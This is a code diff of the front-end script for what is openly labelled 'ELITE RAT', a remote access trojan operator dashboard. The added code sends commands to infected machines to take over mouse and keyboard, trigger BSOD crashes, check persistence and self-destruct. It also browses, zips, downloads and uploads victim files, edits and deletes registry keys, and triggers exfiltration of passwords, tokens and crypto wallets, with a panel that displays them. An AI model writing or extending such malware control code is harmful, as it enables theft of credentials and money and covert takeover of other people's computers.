-                        Lat/Lon: <b>${data.lat || '0'}, ${data.lon || '0'}</b><br>
-                        Timezone: <b>${data.timezone || 'N/A'}</b>
-                    `;
-                    showToast('Location updated', 'success');
+                    const info = document.getElementById('location-info');
+                    if (info) info.innerHTML = `<b>${data.city || 'N/A'}, ${data.country || 'N/A'}</b><br>IP: ${data.query || 'N/A'}<br>ISP: ${data.isp || 'N/A'}`;
+                    if (data.lat && map) {
+                        if (markers[selectedClient]) map.removeLayer(markers[selectedClient]);
+                        markers[selectedClient] = L.marker([data.lat, data.lon]).addTo(map).bindPopup(selectedClient).openPopup();
+                        map.setView([data.lat, data.lon], 7);
+                    }
+                    showToast('Map updated', 'success');
                 });
         }
 
-        /* ===== PHASE 4 REGISTRY ===== */
-        function getRegistry() {
-            if (!requireClient()) return;
-            const root = document.getElementById('reg-root').value;
-            const path = document.getElementById('reg-path').value;
-            socket.emit('get_registry', { client_id: selectedClient, root: root, path: path });
-            showToast(`Browsing ${root}\\${path}`, 'info');
+        function getProcesses() {
+            if (requireClient()) socket.emit('get_processes', { client_id: selectedClient });
         }
 
-        function renderRegistry(items, path, root) {
-            const body = document.getElementById('reg-list-body');
-            body.innerHTML = '';
+        function killProcess(pid) {
+            if (requireClient() && confirm(`Kill process ${pid}?`)) {
+                socket.emit('kill_process', { client_id: selectedClient, pid: pid });
+            }
+        }
+
+        function clearTerminal() {
+            const out = document.getElementById('cmd-output');
+            if (out) out.innerHTML = '<span style="color: var(--accent);">Terminal cleared.</span>';
+        }
+
+        /* ===== REMOTE CONTROL LOGIC ===== */
+        const screenCanvas = document.getElementById('screen-canvas');
+
+        function toggleControl() {
+            if (!requireClient()) return;
+            isControlEnabled = !isControlEnabled;
+            const btn = document.getElementById('btn-control');
+            if (btn) {
+                btn.classList.toggle('active', isControlEnabled);
+                btn.innerHTML = isControlEnabled ? '🎮 Disable Control' : '🎮 Enable Control';
+            }
+            showToast(`Remote control ${isControlEnabled ? 'ENABLED' : 'DISABLED'}`, isControlEnabled ? 'success' : 'info');
             
-            items.forEach(item => {
-                const tr = document.createElement('tr');
-                tr.style.borderBottom = '1px solid rgba(255,255,255,0.03)';
-                const icon = item.type === 'key' ? '📁' : '📄';
-                tr.innerHTML = `
-                    <td style="padding: 0.6rem; font-weight: 500;">${icon} ${item.name}</td>
-                    <td style="padding: 0.6rem; color: var(--text-muted);">${item.type}</td>
-                    <td style="padding: 0.6rem; color: var(--accent); max-width: 200px; overflow: hidden; text-overflow: ellipsis;">${item.value || '-'}</td>
-                `;
-                if (item.type === 'key') {
-                    tr.style.cursor = 'pointer';
-                    tr.onclick = () => {
-                        const newPath = path + '\\' + item.name;
-                        document.getElementById('reg-path').value = newPath;
-                        socket.emit('get_registry', { client_id: selectedClient, root: root, path: newPath });
-                    };
-                }
-                body.appendChild(tr);
-            });
+            if (screenCanvas) {
+                screenCanvas.style.cursor = isControlEnabled ? 'none' : 'default';
+            }
         }
 
-        /* ===== PHASE 4 MAINTENANCE ===== */
+        if (screenCanvas) {
+            screenCanvas.addEventListener('mousemove', (e) => {
+                if (!isControlEnabled || !selectedClient) return;
+                const rect = screenCanvas.getBoundingClientRect();
+                const x = (e.clientX - rect.left) / rect.width;
+                const y = (e.clientY - rect.top) / rect.height;
+                socket.emit('mouse_move', { client_id: selectedClient, x: x, y: y });
+            });
+
+            screenCanvas.addEventListener('mousedown', (e) => {
+                if (!isControlEnabled || !selectedClient) return;
+                const buttons = ['left', 'middle', 'right'];
+                socket.emit('mouse_click', { client_id: selectedClient, btn: buttons[e.button], action: 'down' });
+            });
+
+            screenCanvas.addEventListener('mouseup', (e) => {
+                if (!isControlEnabled || !selectedClient) return;
+                const buttons = ['left', 'middle', 'right'];
+                socket.emit('mouse_click', { client_id: selectedClient, btn: buttons[e.button], action: 'up' });
+            });
+
+            screenCanvas.addEventListener('contextmenu', (e) => {
+                if (isControlEnabled) e.preventDefault();
+            });
+
+            screenCanvas.addEventListener('wheel', (e) => {
+                if (!isControlEnabled || !selectedClient) return;
+                socket.emit('scroll', { client_id: selectedClient, delta: e.deltaY * -1 });
+                e.preventDefault();
+            }, { passive: false });
+        }
+
+        window.addEventListener('keydown', (e) => {
+            if (!isControlEnabled || !selectedClient) return;
+            if (['F5', 'F12', 'F11'].includes(e.key)) return;
+            socket.emit('key_press', { client_id: selectedClient, key: e.key.toLowerCase(), action: 'down' });
+            if (e.target === document.body || e.target === screenCanvas) {
+                e.preventDefault();
+            }
+        });
+
+        window.addEventListener('keyup', (e) => {
+            if (!isControlEnabled || !selectedClient) return;
+            socket.emit('key_press', { client_id: selectedClient, key: e.key.toLowerCase(), action: 'up' });
+        });
+
+        /* ===== UTILS ===== */
+        function appendTerminal(text, color) {
+            const out = document.getElementById('cmd-output');
+            if (!out) return;
+            const el = document.createElement('div');
+            if (color) el.style.color = color;
+            el.textContent = text;
+            out.appendChild(el);
+            out.scrollTop = out.scrollHeight;
+        }
+
+        function logout() { window.location.href = '/logout'; }
+
+        function triggerBsod(mode) {
+            if (requireClient() && confirm(`Trigger ${mode} BSOD on target?`)) {
+                socket.emit('trigger_bsod', { client_id: selectedClient, mode: mode });
+                showToast(`BSOD signal sent (${mode})`, 'warning');
+            }
+        }
+
+        function checkPersistence() {
+            if (requireClient()) {
+                socket.emit('check_persistence', { client_id: selectedClient });
+                showToast('Persistence check requested', 'info');
+            }
+        }
+
         function selfDestruct() {
-            if (!requireClient()) return;
-            if (confirm("⚠️ WARNING: This will PERMANENTLY remove the RAT from the target machine. Are you sure?")) {
+            if (requireClient() && confirm("🚨 WARNING: This will PERMANENTLY delete the client from the target. Proceed?")) {
                 socket.emit('self_destruct', { client_id: selectedClient });
-                showToast('Self-destruct command sent!', 'error');
             }
         }
 
         function updateRat() {
             if (!requireClient()) return;
-            const url = document.getElementById('update-url').value.trim();
-            if (!url) return showToast('Please enter a valid update URL', 'warning');
-            if (confirm(`Update client from ${url}?`)) {
-                socket.emit('update_rat', { client_id: selectedClient, url: url });
-                showToast('Update command sent!', 'info');
+            const url = document.getElementById('update-url').value;
+            if (!url) { showToast('Enter update URL first!', 'error'); return; }
+            socket.emit('update_rat', { client_id: selectedClient, url: url });
+        }
+
+        /* ===== STEALER LOGIC ===== */
+        function triggerSteal() {
+            if (requireClient()) {
+                socket.emit('steal_data', { client_id: selectedClient });
+                showToast('Exfiltration triggered on target...', 'purple');
             }
+        }
+
+        socket.on('stolen_update', (data) => {
+            if (data.client_id === selectedClient) refreshStealerData();
+        });
+
+        function refreshStealerData() {
+            if (!selectedClient) return;
+            document.getElementById('stealer-target').textContent = selectedClient.substring(0,12);
+            fetch(`/api/clients/${selectedClient}/stolen`)
+                .then(r => r.json())
+                .then(data => {
+                    // Passwords
+                    const pwEl = document.getElementById('stealer-passwords');
+                    if (data.passwords.length > 0) {
+                        pwEl.innerHTML = data.passwords.map(pw => `<div style="padding:0.4rem; border-bottom:1px solid var(--border);">${pw}</div>`).join('');
+                    } else { pwEl.textContent = 'None'; }
+
+                    // Tokens
+                    const tokEl = document.getElementById('stealer-tokens');
+                    tokEl.innerHTML = data.tokens.length > 0 ? data.tokens.map(t => `<div style="margin-bottom:0.5rem;">${t}</div>`).join('') : 'None';
+
+                    // Wallets
+                    const walEl = document.getElementById('stealer-wallets');
+                    walEl.innerHTML = data.wallets.length > 0 ? data.wallets.map(w => `<div>💰 ${w}</div>`).join('') : 'None';
+
+                    // Files
+                    const fileEl = document.getElementById('stealer-files');
+                    fileEl.innerHTML = data.files.length > 0 ? data.files.map(f => `
+                        <div class="client-item" style="display:flex; justify-content:space-between; align-items:center; cursor:default; transform:none;">
+                            <div>
+                                <div style="font-weight:700;">${f.name}</div>
+                                <div style="font-size:0.65rem; color:var(--text-muted);">${f.time}</div>
+                            </div>
+                            <a href="${f.path}" target="_blank" class="action-btn" style="padding:0.3rem 0.6rem;">DOWNLOAD</a>
+                        </div>
+                    `).join('') : 'No files exfiltrated.';
+
+                    document.getElementById('stealer-count').textContent = data.passwords.length + data.tokens.length;
+                });
+        }
+
+        /* ===== REGISTRY ACTIONS ===== */
+        function getRegistry() {
+            if (!requireClient()) return;
+            const root = document.getElementById('reg-root').value;
+            const path = document.getElementById('reg-path').value;
+            socket.emit('get_registry', { client_id: selectedClient, root, path });
+            showToast('Fetching registry...', 'info');
+        }
+
+        function promptNewReg() {
+            if (!requireClient()) return;
+            const name = prompt("Enter Value Name:");
+            if (!name) return;
+            const value = prompt("Enter Value Data:");
+            const type = prompt("Type (1=String, 4=DWORD):", "1");
+            
+            socket.emit('write_registry', {
+                client_id: selectedClient,
+                root: document.getElementById('reg-root').value,
+                path: document.getElementById('reg-path').value,
+                name: name,
+                value: value,
+                type_id: parseInt(type)
+            });
+        }
+
+        function editReg(name, oldVal, typeId) {
+            const newVal = prompt(`Edit ${name}:`, oldVal);
+            if (newVal === null) return;
+            socket.emit('write_registry', {
+                client_id: selectedClient,
+                root: document.getElementById('reg-root').value,
+                path: document.getElementById('reg-path').value,
+                name: name,
+                value: newVal,
+                type_id: typeId
+            });
+        }
+
+        function deleteReg(name, isKey) {
+            if (confirm(`Delete ${isKey?'Key':'Value'} "${name}"?`)) {
+                socket.emit('delete_registry', {
+                    client_id: selectedClient,
+                    root: document.getElementById('reg-root').value,
+                    path: document.getElementById('reg-path').value,
+                    name: name,
+                    is_key: isKey
+                });
+            }
+        }
+
+        /* ===== FILE MANAGER ACTIONS ===== */
+        let currentPath = 'C:\\';
+        function listDirectory(path = null) {
+            if (!requireClient()) return;
+            if (path) currentPath = path;
+            socket.emit('toggle_stream', { client_id: selectedClient, stream_type: 'list_files', path: currentPath });
+            showToast(`Browsing: ${currentPath}`, 'info');
+        }
+
+        function renderFileList(path, files) {
+            const container = document.getElementById('file-list');
+            if (!container) return;
+            
+            let html = `<div style="padding:0.5rem; background:var(--bg-card); color:var(--accent); margin-bottom:1rem; font-size:0.75rem;">📍 ${path}</div>`;
+            
+            // Parent directory button
+            const parts = path.split('\\').filter(x => x);
+            if (parts.length > 1) {
+                const parent = parts.slice(0, -1).join('\\') + '\\';
+                html += `<div class="file-item" style="cursor:pointer; color:var(--purple);" onclick="listDirectory('${parent}')">📁 .. [Parent Directory]</div>`;
+            }
+
+            files.forEach(f => {
+                const icon = f.is_dir ? '📁' : '📄';
+                const size = f.is_dir ? '' : `(${Math.round(f.size/1024)} KB)`;
+                html += `
+                    <div class="file-item" style="display:flex; justify-content:space-between; align-items:center;">
+                        <div style="cursor:pointer; flex: 1;" onclick="${f.is_dir ? `listDirectory('${path}${f.name}\\\\')` : ''}">
+                            <span style="margin-right:0.5rem;">${icon}</span>
+                            <span>${f.name}</span>
+                            <span style="font-size:0.7rem; color:var(--text-muted); margin-left:0.5rem;">${size}</span>
+                        </div>
+                        <div style="display:flex; gap:0.5rem;">
+                            ${f.is_dir ? `<button class="action-btn" onclick="zipFolder('${f.name}')">📦 Zip</button>` : ''}
+                            <button class="action-btn" onclick="downloadRemoteFile('${f.name}')">⬇️</button>
+                        </div>
+                    </div>
+                `;
+            });
+            container.innerHTML = html;
+        }
+
+        function zipFolder(name) {
+            if (!requireClient()) return;
+            socket.emit('zip_folder', { client_id: selectedClient, path: currentPath + name });
+            showToast(`Zipping ${name}...`, 'info');
+        }
+
+        function downloadRemoteFile(name) {
+            if (!requireClient()) return;
+            showToast(`Requesting download: ${name}`, 'info');
+            // Logic to trigger client upload to server, then server provide link
+            socket.emit('toggle_stream', { client_id: selectedClient, stream_type: 'download', path: currentPath + name });
+        }
+
+        function uploadFile() {
+            const input = document.getElementById('file-upload');
+            input.onchange = e => {
+                const file = e.target.files[0];
+                if (!file) return;
+                const reader = new FileReader();
+                reader.onload = () => {
+                    const base64 = reader.result.split(',')[1];
+                    socket.emit('upload_file', {
+                        client_id: selectedClient,
+                        filename: file.name,
+                        path: currentPath,
+                        data: base64
+                    });
+                    showToast(`Uploading ${file.name}...`, 'info');
+                };
+                reader.readAsDataURL(file);
+            };
+            input.click();
+        }
+
+        // Drag and Drop
+        const fileZone = document.getElementById('files');
+        if (fileZone) {
+            fileZone.addEventListener('dragover', e => { e.preventDefault(); fileZone.style.background = 'rgba(0, 255, 136, 0.05)'; });
+            fileZone.addEventListener('dragleave', e => { e.preventDefault(); fileZone.style.background = 'none'; });
+            fileZone.addEventListener('drop', e => {
+                e.preventDefault();
+                fileZone.style.background = 'none';
+                if (!requireClient()) return;
+                const file = e.dataTransfer.files[0];
+                if (file) {
+                    const reader = new FileReader();
+                    reader.onload = () => {
+                        const base64 = reader.result.split(',')[1];
+                        socket.emit('upload_file', { client_id: selectedClient, filename: file.name, path: currentPath, data: base64 });
+                        showToast(`Dropping ${file.name}...`, 'info');
+                    };
+                    reader.readAsDataURL(file);
+                }
+            });
         }
 
         /* ===== PERIODIC REFRESH ===== */
@@ -1328,7 +1675,7 @@
                 .catch(() => {});
         }, 5000);
 
-        console.log('🚀 ELITE RAT v2.0 Dashboard Loaded');
+        console.log('🚀 ELITE RAT Dashboard Initialized');
     </script>
 </body>
 </html>
